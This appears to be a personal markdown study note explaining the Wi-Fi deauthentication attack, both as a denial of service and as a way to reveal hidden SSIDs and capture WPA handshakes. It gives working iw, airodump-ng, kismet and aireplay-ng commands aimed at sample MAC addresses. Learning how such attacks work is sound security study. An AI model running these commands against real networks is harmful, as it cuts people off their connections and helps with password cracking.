---
Author: Sumit Kumar
Email: ravirajkarn21@gmail.com
Date Created: 2025-10-07 16:30::25 PM
tags:
  - Linux
  - DoS_attack
  - wifi
  - wireless
  - hacking
  - command
---
	# Deauthenticating Attack
It is kind of [DoS Attack](DoS%20Attack.md).

The easiest way to get the name of a network is to kick a legitimate user off the network and observe the user reconnect to the network. As mentioned previously, association request (and also reassociation request) packets all transmit the SSID in the clear. By kicking a user off the network, you can force him to transmit a reassociation
request and observe the SSID.

This attack is possible because management frames in 802.11 are not authenticated. If management frames were authenticated, the user would be able to differentiate the attacker’s deauthenticate packet from the APs. So all you need to do is send a packet that, to the user, looks like it came from the AP. The user can’t tell the difference, and the wireless driver will reconnect immediately. The user will then transmit a reassociation request with the SSID in it, and your sniffer will capture the network’s name.

## Process of Attack
### using aireplay-ng 
you can skip step 1 and 2 if you already setup monitor mode. 
1. First we will hide our-self with deleting all network interface which emits signals, like managed. use [iw](iw.md)
```bash
 iw dev wlan0 del
```

2. we will create a monitor interface which help us in monitor our surrounding without emitting signals. use [iw](iw.md)
```bash
iw phy phy0 interface add wlan0 type managed # if you deleted your entire interface
iw dev wlan0 interface add mon0 type monitor # if you have one interface running
```

3. We need mac address of victim and Access Point. 
- using **[airodump-ng](airodump-ng.md)** 
```
sudo airodump-ng --gpsd --write file_name mon0
```
- using [kismet](kismet.md)
```bash
kismet
```

4. while monitoring, we will use [aireplay-ng](aireplay-ng.md) 
```bash
sudo aireplay-ng --deauth 1 -a 32:49:1E:B8:8B:9C -c 00:71:CC:3A:31:0F mon0
```
Description: 
- `--deauth <count>` : Type of attack is to launch. number stations to attack.
- `-a <ap mac>` : disguise as mac address.
- `-c <client mac>` : victim mac address.
- `mon0` : It is interface name.

### MDK3


## Conclusion
The argument to --deauth is a count for the number of times to perform the attack; each attack consists of 64 packets from the AP to the client, and 64 packets from the client to the AP.

By performing this attack, we will transmit 128 deauthentication packets (64 in both directions), deauthenticating the client from the AP, as well as the AP from the client. The net result is the client will see a hiccup in her network connectivity and then reassociate. When she does, Kismet will see the SSID in the probe request and association reques packet and can fill in the name. After this, the
user will reassociate, and if the network is using WPA, we will watch the client perform the four-way handshake.